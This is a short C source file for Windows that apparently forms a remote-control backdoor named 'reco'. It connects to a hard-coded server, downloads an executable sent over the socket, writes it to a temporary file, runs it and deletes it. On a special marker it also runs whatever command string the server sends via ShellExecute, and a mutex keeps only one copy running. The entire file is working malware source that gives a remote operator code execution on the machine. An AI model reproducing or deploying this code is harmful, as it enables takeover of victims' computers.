#include <stdio.h>
#include <winsock2.h>
#define SERVADDR "127.0.0.1"
#define EXETMP "reco.tmp"

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char buf[4380], *pbuf;
	int len = 0, size, ret;
	FILE *f = NULL;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WSADATA wsad;
	SOCKET sock;
	struct sockaddr_in sa;

	CreateMutex(NULL, FALSE, "reco");
	if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

	if (WSAStartup(MAKEWORD(2, 2), &wsad) ||
	(sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) goto procend;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(SERVADDR);
	sa.sin_port = htons(80);
	if (connect(sock, (SOCKADDR *)&sa, sizeof(sa)) == SOCKET_ERROR) goto procend;

	while ((ret = recv(sock, buf, sizeof(buf), 0)) != SOCKET_ERROR) {
		if (ret <= 0 || ret == WSAECONNRESET) break;

		if (len <= 0) {
			len = *(int *)buf;
			if (len != 0xffffffff) {
				if ((f = fopen(EXETMP, "wb")) != NULL) fwrite(buf + 4, 1, ret - 4, f);
				size = ret - 4;
			}
		} else {
			if (f != NULL) fwrite(buf, 1, ret, f);
			size += ret;
		}

		if (len == 0xffffffff) {
			buf[ret] = '\0';
			if ((pbuf = strchr(buf + 4, ' ')) != NULL) {
				*pbuf = '\0';
				pbuf++;
			}
			ShellExecute(NULL, NULL, buf + 4, pbuf, NULL, SW_SHOWNORMAL);
		} else if (size >= len) {
			len = 0;

			if (f != NULL) {
				fclose(f);
				f = NULL;

				ZeroMemory(&si,sizeof(si));
				si.cb = sizeof(si);
				if (CreateProcess(EXETMP, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
					WaitForSingleObject(pi.hProcess, INFINITE);
					CloseHandle(pi.hThread);
					CloseHandle(pi.hProcess);
				}

				remove(EXETMP);
			}
		}
	}

procend:
	if (f != NULL) fclose(f);
	closesocket(sock);
	WSACleanup();
	return 0;
}
